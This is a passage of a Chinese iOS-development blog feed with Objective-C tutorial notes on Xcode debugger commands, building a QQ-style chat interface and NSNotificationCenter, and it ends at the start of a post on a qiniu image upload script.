<p>现在如果我们使用DMLog（这个名称可以随便起），它将只向调试版本输出结果，任何成品代码都不会受到影响。<em>PRETTY_FUNCTION</em>也帮上了大忙，它会根据日志信息来源为函数命名。</p>
<p><strong>3.在控制台端手写命令打印</strong></p>
<p>如果我们在应用的特定点进行中断，一般来说是为了检查对象的当前状态。Xcode为我们提供了一套“variables view（变量视图）”，该视图位于Xcode底部，与控制台相邻的左方区域。理论上讲它的作用是显示与当前环境相关的所有值的实时状态，但在实践中有时无法列出值，或者是并未将值更新为中断时的最新状态。幸运的是，我们可以利用一些非常实用的控制台（console）命令自己进行对象检查工作。<a href="http://m.blog.csdn.net/blog/freeWayWalker/45623433#fn:1" target="_blank" rel="external">1</a></p>
<figure class="image-box">
                <img src="http://upload-images.jianshu.io/upload_images/965192-fc1595085f81354f.gif?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img" title="" class="">
                <p>img</p>
            </figure>
<p>po 命令：为 print object 的缩写，显示对象的文本描述。使用p 命令来处理纯量值，即原生类型（boolean、integer、float等）。</p>
<p>print 命令：有点类似于格式化输出，可以输出对象的不同信息。</p>
<p>expr 表达式：打印表达式。</p>
<p>info 命令：我们可以查看内存地址所在信息。</p>
<p>info line *内存地址：可以获取内存地址所在的代码行相关信息。</p>
<p>show 命令：显示 GDB 相关的信息。如：show version 显示GDB版本信息。</p>
<p>bt: 显示当前进程的函数调用栈的情况；”up num”:查看调用的详细信息；down:返回栈列表；l:显示详细代码信息；p:输出数值。</p>
<p>help 命令：如果忘记某条命令的语法了，用来获取帮助信息。</p>
<p>需要注意的是，上述这些都是GDB的调试命令，在LLDB中会有所差异。随着Xcode 5的发布，LLDB调试器已经取代了GDB，成为了Xcode工程中默认的调试器。</p>
<p>这里需要强调的一个技巧是，通过使用expr 表达式可实现在运行时修改变量的值。<a href="http://m.blog.csdn.net/blog/freeWayWalker/45623433#fn:3" target="_blank" rel="external">2</a></p>
<p>expr username = @”username”expr password = @”badpassword”</p>
<p>通过上面的代码段，变量username和password分别被重新赋值。</p>
]]></content>
      
        <categories>
            
            <category> bug调试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS-UI基础(七)]]></title>
      <url>/2017/06/15/iOS-UI%E5%9F%BA%E7%A1%80-%E4%B8%83/</url>
      <content type="html"><![CDATA[<p>iOS-UI基础（七）<br><a id="more"></a></p>
<h1 id="UI基础Day8"><a href="#UI基础Day8" class="headerlink" title="UI基础Day8"></a>UI基础Day8</h1><hr>
<h2 id="1-实例化方法调用顺序"><a href="#1-实例化方法调用顺序" class="headerlink" title="1.实例化方法调用顺序"></a>1.实例化方法调用顺序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//在view的内部会首先调用initWithFrame：传递的frame全为0</div><div class="line">TestView *test1 = [[TestView alloc] init];</div><div class="line">//调用initWithFrame的时候，只走这一个方法</div><div class="line">TestView *test2 = [[TestView alloc] initWithFrame:CGRectZero];</div></pre></td></tr></table></figure>
<h2 id="2-在完成QQ时需要注意的问题"><a href="#2-在完成QQ时需要注意的问题" class="headerlink" title="2.在完成QQ时需要注意的问题"></a>2.在完成QQ时需要注意的问题</h2><p>1.在将一个类作为另一个类的属性，需要调用的时候，这个属性应该设置为强引用，而不是弱引用类型，不然在调用他的时候存放数据的内存空间已经被释放掉了，查看内存的时候会发现这个类中的属性的内存地址全是nil。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">@property (nonatomic, strong) QQModel *qqmodel;</div><div class="line">//如果将这个设置为weak，那么在调用frameModel.qqmodel时，qqmodel的内存地址就是0。</div></pre></td></tr></table></figure>
<p>2.在设置子控件的frame的时候，注意不要把高度设置的过大，如果设置为整个屏幕的高度，会出现一些无厘头的情况，而且排错的时候可能会误认为是cell重用时的错，比较浪费时间。</p>
<p>3.在设置文本的时候要设置它的真实宽高。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">CGFloat maxWidth = kScreenSize.width - 2 * margin -2 * iconWidth;</div><div class="line">    CGSize maxSize = CGSizeMake(maxWidth, MAXFLOAT);</div><div class="line">    </div><div class="line">    NSDictionary *dict = @&#123;NSFontAttributeName:[UIFont systemFontOfSize:17]&#125; ;</div><div class="line">    </div><div class="line">    CGSize textRealSize = [qqmodel.text boundingRectWithSize:maxSize options:NSStringDrawingUsesLineFragmentOrigin attributes:dict context:nil].size;</div></pre></td></tr></table></figure>
<p>4.图片的拉伸</p>
<p>在对图片进行拉伸的时候最好尽量靠近它的中心点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">//抽取图片拉伸的方法</div><div class="line">-(UIImage *)resizeImage:(NSString *)imageName&#123;</div><div class="line">    UIImage *image = [UIImage imageNamed:imageName];</div><div class="line">    </div><div class="line">    CGFloat halfWidth = image.size.width/2;</div><div class="line">    </div><div class="line">    CGFloat halfHeight = image.size.height/2;</div><div class="line">    </div><div class="line">    UIImage *resizeImage = [image resizableImageWithCapInsets:UIEdgeInsetsMake(halfHeight, halfWidth, halfHeight, halfWidth) resizingMode:UIImageResizingModeStretch];</div><div class="line">    </div><div class="line">    return resizeImage;	</div><div class="line">  </div><div class="line">//  UIImageResizingModeTile,  平铺</div><div class="line">//  UIImageResizingModeStretch, 拉伸</div></pre></td></tr></table></figure>
<p>图片的拉伸除了可以用代码的方法，还可以通过slicing的方式，选中Assets.xcassets中你要拉伸的那一张图，右下角有一个Show Slicing的方式可供选择，点击之后在下图中的部分修改其拉伸的方式等各种设置：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/Slicing.png" alt="Slicing.png" title="" class="">
                <p>Slicing.png</p>
            </figure>
<p>slicing其实就是可视化的图形拉伸：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/slicing1.png" alt="slicing1.png" title="" class="">
                <p>slicing1.png</p>
            </figure></p>
<p>5.设置内边距</p>
<p>没有设置内边距：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%86%85%E8%BE%B9%E8%B7%9D.png" alt="内边距.png" title="" class="">
                <p>内边距.png</p>
            </figure></p>
<p>设置好了内边距，但是没有增加宽高：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-14%20%E4%B8%8B%E5%8D%8812.00.42.png" alt="屏幕快照 2017-06-14 下午12.00.42.png" title="" class="">
                <p>屏幕快照 2017-06-14 下午12.00.42.png</p>
            </figure></p>
<p>所以，不管怎么样增加button的宽高，如果没有设置内边距，文字有时候还是会超出背景图片。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//设置内边距</div><div class="line">contentButton.contentEdgeInsets = UIEdgeInsetsMake(20, 20, 20, 20);</div><div class="line">//增加button的宽高</div><div class="line">#define kDeltamargin 40</div><div class="line">_textFrame.size.width += kDeltamargin;</div><div class="line">_textFrame.size.height += kDeltamargin;</div></pre></td></tr></table></figure>
<p>6.timeLabel的显示问题</p>
<p>当消息发出的时间和上一条消息发出的时间相同的时候，不需要显示两者，此时隐藏掉后者即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">//记录timeLabel中的cell是否需要隐藏掉,将其设置为qqmodel的一个属性</div><div class="line">@property (nonatomic, assign, getter=isHiddenTimeLabel) BOOL hiddenTimeLabel;</div><div class="line">//在将数据写入可变数组的时候将是否隐藏传进去</div><div class="line"> </div><div class="line">        for(NSDictionary *dict in tempArray)&#123;</div><div class="line">            </div><div class="line">            QQModel *model = [QQModel qqModelWithDict:dict];</div><div class="line">            </div><div class="line">            QQFrameModel *lastFrameModel = self.dataArray.lastObject;</div><div class="line">            </div><div class="line">            if([model.time isEqualToString:lastFrameModel.qqmodel.time])&#123;</div><div class="line">                model.hiddenTimeLabel = YES;</div><div class="line">            &#125;</div><div class="line">            </div><div class="line">            QQFrameModel *frameModel = [[QQFrameModel alloc] init];</div><div class="line">            </div><div class="line">            frameModel.qqmodel = model;</div><div class="line">            </div><div class="line">            [_dataArray addObject:frameModel];</div><div class="line">        &#125;</div></pre></td></tr></table></figure>
<p>7.用枚举类型让数据变的有意义</p>
<p>为了让用户和其他人的类型代码更好理解，可以使用枚举类型。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//通过QQUserType的枚举类型来代替之前的0和1，让更好理解代码</div><div class="line">typedef NS_ENUM(NSInteger(内部的值类型),QQUsertype（枚举的名称）)&#123;</div><div class="line">    QQUsertypeOther,//如果不声明，默认是从零开始的</div><div class="line">    QQUsertypeMe,</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>8.再点击输入框的时候，输入框没有和键盘一起向上移动</p>
<p>可以使用平移的方式来让输入框向上移动</p>
<p>view在平移的时候，必须要知道键盘从出来到停止的时间</p>
<p>键盘平移的距离就是键盘的高度，这个时候就是用通知的方式来完成键盘和输入框的同步。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">- (void)registerNotification&#123;</div><div class="line">  //添加点击键盘时候的监听者</div><div class="line">    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(keyboardWillAppear:) name:UIKeyboardWillShowNotification object:nil];</div><div class="line">  //收起键盘是的监听者</div><div class="line">    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(keyboardWillDisappear:) name:UIKeyboardWillHideNotification object:nil];</div><div class="line">&#125;</div><div class="line">//输入的时候调用的方法</div><div class="line">- (void)keyboardWillAppear:(NSNotification *)noti&#123;</div><div class="line">    </div><div class="line">    NSDictionary *dict = noti.userInfo;</div><div class="line">    </div><div class="line">    NSTimeInterval interval = [dict[UIKeyboardAnimationDurationUserInfoKey] doubleValue];</div><div class="line">    </div><div class="line">    // 键盘的高度</div><div class="line">    // 停止后的Y值</div><div class="line">    CGRect keyboardRect = [dict[UIKeyboardFrameEndUserInfoKey] CGRectValue];</div><div class="line">    </div><div class="line">    CGFloat keyboardEndY = keyboardRect.origin.y;</div><div class="line">    </div><div class="line">    // 没出现时的Y值</div><div class="line">    CGRect tempRect = [dict[UIKeyboardFrameBeginUserInfoKey] CGRectValue];</div><div class="line">    </div><div class="line">    CGFloat keyboardBeginY = tempRect.origin.y;</div><div class="line">    </div><div class="line">    // 对 tableView  执行动画， 向上平移</div><div class="line">    [UIView animateWithDuration:interval animations:^&#123;</div><div class="line">        </div><div class="line">        self.view.transform = CGAffineTransformMakeTranslation(0, (keyboardEndY - keyboardBeginY));</div><div class="line">    &#125;];</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>9.在选中cell的时候，cell会变色，看起来不真实，此时在初始化cell的时候就可以设置cell的属性，使其选中不变色：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cell.selectionStyle = UITableViewCellSelectionStyleNone;</div></pre></td></tr></table></figure>
<p>10.一般的qq在打开的时候都是滚动到最底层，所以这里在加载的时候也需要这样，在ViewDidLoad加入下面这个方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">- (void)scrollToButtom&#123;</div><div class="line">    NSIndexPath *indexPath = [NSIndexPath indexPathForRow:self.dataArray.count-1 inSection:0];</div><div class="line">    </div><div class="line">    [_tabelView scrollToRowAtIndexPath:indexPath atScrollPosition:UITableViewScrollPositionBottom animated:YES];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="textField应用"><a href="#textField应用" class="headerlink" title="textField应用"></a>textField应用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">//设置提示文字</div><div class="line">_textField.placeholder = @&quot;请输入用户名&quot;;</div><div class="line">//设置leftView的时候，采用直接赋值的方法是看不到的</div><div class="line">	UIView *leftView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 30, 30)];</div><div class="line">    leftView.backgroundColor = [UIColor redColor];</div><div class="line">    test.leftView = leftView;</div><div class="line">    test.leftViewMode = UITextFieldViewModeWhileEditing;</div><div class="line">/*</div><div class="line">	UITextFieldViewModeNever,   绝不显示，默认的值</div><div class="line">    UITextFieldViewModeWhileEditing,  当编辑时显示</div><div class="line">    UITextFieldViewModeUnlessEditing,  如果编辑，就不显示了</div><div class="line">    UITextFieldViewModeAlways 总是显示</div><div class="line">*/</div></pre></td></tr></table></figure>
<h5 id="输入框状态介绍："><a href="#输入框状态介绍：" class="headerlink" title="输入框状态介绍："></a>输入框状态介绍：</h5><p>clear button同样也有上述四种状态：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-14%20%E4%B8%8B%E5%8D%885.21.11.png" alt="屏幕快照 2017-06-14 下午5.21.11.png" title="" class="">
                <p>屏幕快照 2017-06-14 下午5.21.11.png</p>
            </figure></p>
<p>如果选择显示就是出现右方的那个按钮，可以快速清空输入框</p>
<p>而安全文本输入则是让你的输入不回显。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">test.clearButtonMode = YES;</div><div class="line">test.secureTextEntry = YES;</div></pre></td></tr></table></figure>
<h2 id="通知简介"><a href="#通知简介" class="headerlink" title="通知简介"></a>通知简介</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E9%80%9A%E7%9F%A5%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="通知示意图.png" title="" class="">
                <p>通知示意图.png</p>
            </figure>
<ul>
<li><p>每一个应用程序都有一个通知中心（NSNotificationCenter）实例，专门负责协助不同对象之间的消息通信</p>
</li>
<li><p>任何一个对象都可以向控制中心发布通知，描述自己在做什么。其他感兴趣的对象（Observer）可以申请在某个特定通知发布时（或者在某个特定对象发布通知时）收到这个通知。</p>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-14%20%E4%B8%8B%E5%8D%8810.33.46.png" alt="屏幕快照 2017-06-14 下午10.33.46.png"></p>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-14%20%E4%B8%8B%E5%8D%8810.35.51.png" alt="屏幕快照 2017-06-14 下午10.35.51.png"></p>
</li>
</ul>
<p>使用通知的流程：</p>
<p>1.添加监听者</p>
<p>2.在适当的时候发布通知</p>
<p>3.当监听对象被销毁的时候，一定要从通知中心把它移除掉。</p>
<p>同时要注意发布消息时的属性设置问题。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%8F%91%E5%B8%83%E9%80%9A%E7%9F%A5%E7%9A%84%E6%97%B6%E5%80%99obj%20%E5%92%8Cname%E4%B8%8D%E8%83%BD%E4%B8%BA%E7%A9%BA.png" alt="发布通知的时候obj 和name不能为空.png" title="" class="">
                <p>发布通知的时候obj 和name不能为空.png</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">//以订阅漫画为例子</div><div class="line">#import &lt;Foundation/Foundation.h&gt;</div><div class="line">#import &quot;Person.h&quot;</div><div class="line">#import &quot;Company.h&quot;</div><div class="line">int main(int argc, const char * argv[]) &#123;</div><div class="line">    @autoreleasepool &#123;</div><div class="line">       </div><div class="line">        Company *souhu = [[Company alloc] init];</div><div class="line">        souhu.companyName = @&quot;搜狐&quot;;</div><div class="line">        souhu.movieName = @&quot;全职猎人&quot;;</div><div class="line">        </div><div class="line">        Company *tudou = [[Company alloc] init];</div><div class="line">        tudou.companyName = @&quot;土豆&quot;;</div><div class="line">        tudou.movieName = @&quot;极品家丁&quot;;</div><div class="line">        </div><div class="line">        Person *li = [[Person alloc] init];</div><div class="line">        li.name = @&quot;离&quot;;</div><div class="line">        </div><div class="line">        Person *zhangsan = [[Person alloc] init];</div><div class="line">        zhangsan.name = @&quot;张三&quot;;</div><div class="line">        </div><div class="line">#warning 1.注册监听</div><div class="line">        [[NSNotificationCenter defaultCenter] addObserver:zhangsan selector:@selector(recieveNotification:) name:@&quot;hunter&quot; object:souhu];</div><div class="line">        </div><div class="line">        [[NSNotificationCenter defaultCenter] addObserver:li selector:@selector(recieveNotification:) name:@&quot;renzhe&quot; object:tudou];</div><div class="line">#warning 2.发布通知</div><div class="line">        [[NSNotificationCenter defaultCenter] postNotificationName:@&quot;hunter&quot; object:souhu userInfo:@&#123;@&quot;company&quot;:souhu&#125;];</div><div class="line">        [[NSNotificationCenter defaultCenter] postNotificationName:@&quot;renzhe&quot; object:tudou userInfo:@&#123;@&quot;company&quot;:tudou&#125;];</div><div class="line">    &#125;</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line">//Person.m中的部分</div><div class="line">#import &quot;Person.h&quot;</div><div class="line">#import &quot;Company.h&quot;</div><div class="line">@implementation Person</div><div class="line">-(void)recieveNotification:(NSNotification *)noti&#123;</div><div class="line">    //取出userInfo</div><div class="line">    NSDictionary *dict = noti.userInfo;</div><div class="line">    //取出公司信息</div><div class="line">    Company *company = dict[@&quot;company&quot;];</div><div class="line">    </div><div class="line">    NSLog(@&quot;%@,订阅了%@, %@ 更新了&quot;,self.name, company.companyName, company.movieName);</div><div class="line">&#125;</div><div class="line"></div><div class="line">#warning 3.移除监听</div><div class="line">-(void)dealloc&#123;</div><div class="line">    [[NSNotificationCenter defaultCenter]removeObserver:self];</div><div class="line">&#125;</div><div class="line">@end</div></pre></td></tr></table></figure>
<h2 id="给QQ增添消息和自动回复"><a href="#给QQ增添消息和自动回复" class="headerlink" title="给QQ增添消息和自动回复"></a>给QQ增添消息和自动回复</h2><p>所有的消息显示首先都是从对象数组中读取的，所以如果要把消息显示到屏幕上需要把我们要添加的消息加入到数组之中，也就是重新声明一个新的对象；</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">//当点击键盘右下角的return按钮时就会调用这个方法</div><div class="line">- (BOOL)textFieldShouldReturn:(UITextField *)textField &#123;</div><div class="line">    static NSInteger x = 1;</div><div class="line">    // 撤销 ， textField 的第一响应者身份</div><div class="line">    [textField resignFirstResponder];</div><div class="line">    //发送自己的消息</div><div class="line">    [self sendMessage:textField.text andType:QQUsertypeMe];</div><div class="line">    //设置自动回复</div><div class="line">    NSString *string = [NSString stringWithFormat:@&quot;这是第%ld次,你是不是傻&quot;,x];</div><div class="line">    [self sendMessage:string andType:QQUsertypeOther];</div><div class="line">    //清空textField中的数据</div><div class="line">    textField.text = @&quot;&quot;;</div><div class="line">    x += 1;</div><div class="line">    return YES;</div><div class="line">&#125;</div><div class="line">//发送信息调用的方法</div><div class="line">- (void)sendMessage:(NSString *)text andType:(QQUsertype)type&#123;</div><div class="line">    QQModel *qqmodel = [[QQModel alloc] init];</div><div class="line">    //取出当前时间</div><div class="line">    NSDate *currentDate = [NSDate date];</div><div class="line">    //设置时间格式</div><div class="line">    NSDateFormatter *formatter = [[NSDateFormatter alloc] init];</div><div class="line">    </div><div class="line">    formatter.dateFormat = @&quot;HH:mm&quot;;</div><div class="line">    </div><div class="line">    NSString *dateString = [formatter stringFromDate:currentDate];</div><div class="line">    </div><div class="line">    qqmodel.time = dateString;</div><div class="line">    </div><div class="line">    qqmodel.text = text;</div><div class="line">    </div><div class="line">    qqmodel.type = type;</div><div class="line">    </div><div class="line">    QQFrameModel *lastFrameModel = self.dataArray.lastObject;</div><div class="line">    </div><div class="line">    if([qqmodel.time isEqualToString:lastFrameModel.qqmodel.time])&#123;</div><div class="line">        qqmodel.hiddenTimeLabel = YES;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    //把qqmodel赋值给qqFrameModel，要根据内容计算控件的frame以及cell的高度</div><div class="line">    QQFrameModel *frameModel = [[QQFrameModel alloc] init];</div><div class="line">    </div><div class="line">    frameModel.qqmodel = qqmodel;</div><div class="line">    </div><div class="line">    [self.dataArray addObject:frameModel];</div><div class="line">    </div><div class="line">    NSIndexPath *indexPath = [NSIndexPath indexPathForRow:self.dataArray.count-1 inSection:0];</div><div class="line">    //动画的方式加载新添加的数据</div><div class="line">    [_tabelView insertRowsAtIndexPaths:@[indexPath] withRowAnimation:UITableViewRowAnimationLeft];</div><div class="line">    //滚动到最后一行</div><div class="line">    [_tabelView scrollToRowAtIndexPath:indexPath atScrollPosition:UITableViewScrollPositionBottom animated:YES];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><a href="https://github.com/Peterpan0927/iOS-test/tree/master/QQchat" target="_blank" rel="external">源码仓库</a></p>
]]></content>
      
        <categories>
            
            <category> TableView基础达成 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[七牛图片自动上传]]></title>
      <url>/2017/06/15/%E4%B8%83%E7%89%9B%E5%9B%BE%E7%89%87%E8%87%AA%E5%8A%A8%E4%B8%8A%E4%BC%A0/</url>
      <content type="html"><![CDATA[<p>qiniu4blog自动上传<br><a id="more"></a></p>
<h2 id="源码部分"><a href="#源码部分" class="headerlink" title="源码部分"></a>源码部分</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div 